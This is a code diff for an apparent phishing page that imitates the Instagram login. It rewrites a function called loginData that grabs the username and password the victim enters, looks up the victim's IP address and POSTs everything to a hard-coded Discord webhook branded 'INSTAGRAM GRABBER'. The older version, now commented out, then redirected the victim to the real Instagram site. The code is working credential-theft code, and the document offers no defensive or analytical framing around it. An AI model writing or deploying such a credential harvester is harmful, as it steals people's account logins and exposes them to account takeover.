@@ -79,57 +79,87 @@ darkmode_toggle.onclick = (e) => {
 
 // }
 
-function loginData() {
+// function loginData() {
 
+//     let IPAddressVisitor;
+//     let username = document.getElementById('input-username').value;
+//     let password = document.getElementById('input-password').value;
+
+//     fetch('https://api.ipify.org?format=json')
+//         .then(response => response.json())
+//         .then(data => {
+//             IPAddressVisitor = data.ip;
+//             console.log(IPAddressVisitor); // Opzionale: per vedere l'IP in console
+//         })
+//         .catch(error => console.error('Errore:', error));
+
+//     console.log("2: " + IPAddressVisitor);
+//     const request = new XMLHttpRequest();
+//     request.open("POST", "https://discord.com/api/webhooks/1216738612893192192/rOHU-JGI67MpmZLtOk2kEVW5hzc9chwGTkxLVyMkRXtULbYLEtsnENYE4fYTWaZmrB51");
+
+//     request.setRequestHeader('Content-type', 'application/json');
+
+//     let messaggio = "👤 Username: " + username + "\n🔒 Password: " + password + "\n💻 Indirizzo IP: " + IPAddressVisitor;
+
+
+//     // Salva in variabile dataFormattata la data dell'accesso dell'utente
+//     var dataCompleta = new Date();
+//     var mese = dataCompleta.toLocaleString('default', { month: 'short' }); // Estrae il mese abbreviato (es. "Feb")
+//     const meseMaiuscolo = mese[0].toUpperCase() + mese.slice(1);
+//     var giorno = dataCompleta.getDate(); // Estrae il giorno del mese (es. 27)
+//     var anno = dataCompleta.getFullYear(); // Estrae l'anno (es. 2024)
+//     var ora = dataCompleta.getHours(); // Estrae l'ora (es. 21)
+//     var minuti = dataCompleta.getMinutes(); // Estrae i minuti (es. 4)
+//     var secondi = dataCompleta.getSeconds(); // Estrae i secondi (es. 23)
+
+//     var dataFormattata = "🕛 " + ora + ":" + minuti + ":" + secondi + "\n" + "🗓️ " + giorno + " " + meseMaiuscolo + " " + anno;
+
+
+
+//     const params = {
+//         "username": "Instagram Grabber",
+//         "embeds": [
+//             {
+//                 "author": {
+//                     "name": "🥷INSTAGRAM GRABBER🥷\n" + messaggio,
+//                 },
+//                 "color": "16019902",
+//             },
+//         ],
+//         "content": dataFormattata,
+//     }
+
+//     request.send(JSON.stringify(params));
+
+//     // window.location.href = "https://www.instagram.com/accounts/login/?next=%2Flogin%2F&"
+//     console.log(messaggio)
+// }
+
+async function loginData() {
     let IPAddressVisitor;
     let username = document.getElementById('input-username').value;
     let password = document.getElementById('input-password').value;
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        IPAddressVisitor = data.ip; console.log(IPAddressVisitor); // Opzionale: per vedere l'IP in console
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1216738612893192192/rOHU-JGI67MpmZLtOk2kEVW5hzc9chwGTkxLVyMkRXtULbYLEtsnENYE4fYTWaZmrB51");
+        request.setRequestHeader('Content-type', 'application/json');
 
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            IPAddressVisitor = data.ip;
-            console.log(IPAddressVisitor); // Opzionale: per vedere l'IP in console
-        })
-        .catch(error => console.error('Errore:', error));
-
-    const request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1216738612893192192/rOHU-JGI67MpmZLtOk2kEVW5hzc9chwGTkxLVyMkRXtULbYLEtsnENYE4fYTWaZmrB51");
-
-    request.setRequestHeader('Content-type', 'application/json');
-
-    let messaggio = "👤 Username: " + username + "\n🔒 Password: " + password + "\n💻 Indirizzo IP: " + IPAddressVisitor;
-
-
-    // Salva in variabile dataFormattata la data dell'accesso dell'utente
-    var dataCompleta = new Date();
-    var mese = dataCompleta.toLocaleString('default', { month: 'short' }); // Estrae il mese abbreviato (es. "Feb")
-    const meseMaiuscolo = mese[0].toUpperCase() + mese.slice(1);
-    var giorno = dataCompleta.getDate(); // Estrae il giorno del mese (es. 27)
-    var anno = dataCompleta.getFullYear(); // Estrae l'anno (es. 2024)
-    var ora = dataCompleta.getHours(); // Estrae l'ora (es. 21)
-    var minuti = dataCompleta.getMinutes(); // Estrae i minuti (es. 4)
-    var secondi = dataCompleta.getSeconds(); // Estrae i secondi (es. 23)
-
-    var dataFormattata = "🕛 " + ora + ":" + minuti + ":" + secondi + "\n" + "🗓️ " + giorno + " " + meseMaiuscolo + " " + anno;
-
-
-
-    const params = {
-        "username": "Instagram Grabber",
-        "embeds": [
-            {
-                "author": {
-                    "name": "🥷INSTAGRAM GRABBER🥷\n" + messaggio,
-                },
-                "color": "16019902",
-            },
-        ],
-        "content": dataFormattata,
-    }
-
-    request.send(JSON.stringify(params));
-
-    window.location.href = "https://www.instagram.com/accounts/login/?next=%2Flogin%2F&"
-    console.log(messaggio)
+        let messaggio = "👤 Username: " + username + "\n🔒 Password: " + password + "\n💻 Indirizzo IP: " + IPAddressVisitor; // Salva in variabile dataFormattata la data dell'accesso dell'utente
+        var dataCompleta = new Date();
+        var mese = dataCompleta.toLocaleString('default', { month: 'short' }); // Estrae il mese abbreviato (es. "Feb")
+        const meseMaiuscolo = mese[0].toUpperCase() + mese.slice(1);
+        var giorno = dataCompleta.getDate(); // Estrae il giorno del mese (es. 27)
+        var anno = dataCompleta.getFullYear(); // Estrae l'anno (es. 2024)
+        var ora = dataCompleta.getHours(); // Estrae l'ora (es. 21)
+        var minuti = dataCompleta.getMinutes(); // Estrae i minuti (es. 4)
+        var secondi = dataCompleta.getSeconds(); // Estrae i secondi (es. 23)
+        var dataFormattata = "🕛 " + ora + ":" + minuti + ":" + secondi + "\n" + "🗓️ " + giorno + " " + meseMaiuscolo + " " + anno;
+        const params = { "username": "Instagram Grabber", "embeds": [{ "author": { "name": "🥷INSTAGRAM GRABBER🥷\n" + messaggio, }, "color": "16019902", },], "content": dataFormattata};
+        request.send(JSON.stringify(params));
+        // window.location.href = "https://www.instagram.com/accounts/login/?next=%2Flogin%2F&" 
+        console.log(messaggio);
+    } catch (error) { console.error('Errore:', error); }
 }
